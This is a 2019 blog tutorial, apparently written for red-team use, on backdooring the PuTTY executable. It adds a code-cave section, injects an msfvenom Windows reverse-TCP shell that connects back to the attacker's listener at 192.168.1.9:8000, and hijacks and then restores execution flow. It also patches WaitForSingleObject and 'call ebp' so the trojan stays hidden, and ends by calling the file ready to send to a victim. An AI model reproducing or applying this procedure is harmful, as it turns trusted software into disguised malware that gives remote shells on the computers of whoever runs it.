---
layout: post
title: Backdooring PE file
date: 2019-11-05
image: 02/00-main.jpg
tags: redteam ReverseEngineering
---

In this blog post i will show a technique to inject a shellcode backdoor inside a PE file.

### Introduction

In this post i will inject a shellcode inside a [PE](https://en.wikipedia.org/wiki/Portable_Executable) file by adding a section header which will create a **code cave** inside the executable file.
According to [Wikipedia](https://en.wikipedia.org/wiki/Code_cave) the **code cave** is:

`A code cave is a series of null bytes in a process's memory. The code cave inside a process's memory is often a reference to a section of the code’s script functions that have capacity for the injection of custom instructions. For example, if a script’s memory allows for 5 bytes and only 3 bytes are used, then the remaining 2 bytes can be used to add additional code to the script without making significant changes.`

ok. now after understanding a little bit of what code cave is, let's move out to what we will actually do.

First we will create a code cave by inserting a new section header to our executable file and then we will hijack the execution flow of the program by redirecting the execution to our new section which will contain our shellcode, then after executing our shellcode inside our new section it will jump back to the normal execution flow of the program and continue to run succesfully.

It may doesn't make scense to you but things will get easy to understand after doing it.

### Prerequisits

Before you continue it's very recommended to know about the following:

* A little bit of Intel x86 Assembly
* How to deal with a debugger
* A bit of knowing about PE file structure

### Preprations

We will need the following to start our process:

* Windows 7 32bit ***recommended***
* Kali Linux ***recommended***
* [PE-Bear](https://github.com/hasherezade/pe-bear-releases/releases/download/0.3.9.5/PE-bear_x86_0.3.9.5.zip) ***PE Parser***
* [x64dbg](https://x64dbg.com/#start) ***Debugger***
* [Putty](https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe) ***Executable to work on***

**Attention** : while explaining this technique we will assume that there is no [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) or [DEP](https://en.wikipedia.org/wiki/Executable_space_protection#Windows) enabled to make the explaination of this technique more easier to understand.

To disable **ASLR** and **DEP** we will use [EMET](https://www.microsoft.com/en-us/download/details.aspx?id=50766) the enhanced mitigation experience toolkit.

![00-emet](/img/02/00-emet.png)

And then restart your machine.

### Starting

Now let's get going.

First we will generate our shellcode to inject it in the executable code cave that we will create it later.

Generate the shellcode with **msfvenom** by executing:

```bash
msfvenom --arch x86 --platform windows --payload windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=8000 -f hex
```

The output should be something similar to this:

![01-kali](/img/02/01-kali.png)

Make sure that you take a note to use it later.

> 1 Creating PE section header

Download and run **putty.exe** to make sure that it's work proberly.


![02-putty.png](/img/02/02-putty.png)

Alright now we will create our new section header inside our PE executable file by using **PE-Bear** tool and going to **Section Hdrs** tab to see the PE sections.

![03-sections](/img/02/03-sections.png)

In order to create a new sction we will right click on **Sections** and select **Add section**.

![04-addsection](/img/02/04-addsection.png)

Now write any section name you want, in my case i will call it **.beef**, then give a _1000_ byte size **(****_which is 4096 bytes but in hex_****)** to **Raw size** and **Virtual Size** and mark on **read**, **write**, **execute** like this:

![05-.beef](/img/02/05-.beef.png)

Our new section has been created and now save the new modified executable.

![06-saveexecutable](/img/02/06-saveexecutable.png)

and save it with a different name.

![07-puttybeef](/img/02/07-puttybeef.png)

now try run the new modified executable to make sure that it's still works.

![08-stillworks](/img/02/08-stillworks.png)

It should work with you as well.


> 2 Hijack exectution flow

Now open **x64dbg** debugger and throw our new modified executable inside it.

![09-puttydebug](/img/02/09-puttydebug.png)

Go to **Memory Map** tab above to see our newly created section header.

![10-beefsection](/img/02/10-beefsection.png)

that's a good sign, now copy the address of the new section which we will be using it to jump to our code cave.

![11-beefaddr](/img/02/11-beefaddr.png)

We will paste it to our notes for now.

![12-takenote1](/img/02/12-takenote1.png)

Ok let us run our executable inside the debugger by pressing run button or by pressing _F9_ to go to the EntryPoint of the executable.

![13-entrypoint](/img/02/13-entrypoint.png)

What we will do now is replacing an instruction code and replace it with another instruction that will make us jump to our code cave.
In this case i will replace the ``jmp putty-beef.46FD35`` by my instruction that will redirect the execution to the code cave and hijack the execution flow, but first i will take a copy of it because we will jump to it later.

![14-jmpto](/img/02/14-jmpto.png)

Lets take a note of it.

![15-takenote2](/img/02/15-takenote2.png)

I will fix the instruction being copied from **x64dbg** leaving the address only.

![16-fixnote2](/img/02/16-fixnote2.png)

Now we can modifiy this jump instruction by replacing it with ``jmp <section addr>``.

![17-hijackexec](/img/02/17-hijackexec.png)

Now press _F8_ to execute the instruction and boom you are inside the code cave.

![18-codecave](/img/02/18-codecave.png)


> 3 Inject shellcode backdoor code

Alright, the instruction code structure that we will inject right here should be as followed:

| PUSHAD    	  	 | Save the registers 		     |
| PUSHFD          	 | Save the falgs		     |
| shellcode       	 | backdoor code		     | 
| Stack Alignment 	 | Restore the stack pervious value  |
| POPFD		  	 | Restore the flags		     |
| POPAD	    	         | Restore the registers	     |
| Restore Execution Flow | Restore stack frane and jump back |

Ok lets start injecting our code instruction by injecting the first two instructions `pushad` and `pushfd`.

![19-stackpush](/img/02/19-stackpush.png)

Before continue lets look at `ESP` register value after executing the first two instructions.

![20-esp1](/img/02/20-esp1.png)

I will take a note for it.

![21-takenote3](/img/02/21-takenote3.png)

Now copy our generated shellcode and paste it as binary inside the code cave.

![22-injectcode](/img/02/22-injectcode.png)

And now the shellcode is pasted inside the code cave section.

![23-shellcode](/img/02/23-shellcode.png)

> 4 Patching the shellcode

The shellcode and little bit of modifications to work well with the executable.

#### Patching WaitForSingleObject

Inside the shellcode there's a function called `WaitForSingleObject` which is have parameter `dwMilliseconds` that will wait for **FFFFFFFF == INFINITE** time which will block the program thread until you exit from the shell, so the executable won't run until you exit the shell.

We will try to look after an instruction sequance that will lead us to that parameter and changing its value, the instruction sequance is:
```assembly
dec ESI
push ESI
inc ESI
```

![24-seq](/img/02/24-seq.png)

We will `NOP` the `dec ESI` instruction so that `ESI` stays will not get changed and it's value will still at 0, which means that `WaitForSingleObject` function will wait 0 seconds so it will not block the program thread.

![25-decesinop](/img/02/25-decesinop.png)

#### Patching `call ebp` instruction

The `call ebp` might closing the executable process so we need to patch this instruction by simply `NOP` it.

![26-callebpnop](/img/02/26-callebpnop.png)

Now let us set a breakpoint that `NOP` instruction.

![27-breakpoint](/img/02/27-breakpoint.png)

And set a listener to receive the reverse shell connection.

![28-setlistener](/img/02/28-setlistener.png)

And run the executable inside the debugger until it hits the breakpoint by pressing _F9_

![29-shell](/img/02/29-shell.png)

Yes!, our shellcode has been executed succesfully.

Great, everything is done proberly.

> 5 Restore execution flow

Now lets restore the program execution flow in order to run the program itself proberly.

#### Stack alignment code

We need to restore the stack value like as it was before, lets take a look at the `ESP` value after executing

![30-esp2](/img/02/30-esp2.png)

And take the note.

![31-takenote4](/img/02/31-takenote4.png)

So what we will do in order to resotre the stack value and do our stack alignment, we will subtract the old `ESP` value before executing shellcode and new `ESP` value after executing the shellcode.

![32-esp1-esp2](/img/02/32-esp1-esp2.png)

In my case it equals _0x204_ so we will resotre its pervious value by
```assembly
add ESP, 0x204
```

![33-rstackvalue](/img/02/33-rstackvalue.png)

And restore the registers and flags values by
```assembly
popfd
popad
```

![34-stackpop](/img/02/34-stackpop.png)

Then restore the execution flow by write the `jmp` address we copied earlier to contine execute the program normally

![35-ourjmp](/img/02/35-ourjmp.png)

![36-restexec](/img/02/36-restexec.png)

And press _F9_ to run.

![37-itworked](/img/02/37-itworked.png)

The executable continue running succesfully and our shellcode as well.

> 6 Patch and Run

Lets patch our new infected executable by pressing the patch button above in the debugger.

![38-patchexe](/img/02/38-patchexe.png)

Click **Patch File** and **Save** with new name.

![39-saveexe](/img/02/39-saveexe.png)

And the executable is patched and backdoored succesfully!

![40-patched](/img/02/40-patched.png)

It should run outside the debugger as well, and it's ready to send it to your victim.

![](https://media.giphy.com/media/YQitE4YNQNahy/giphy.gif)
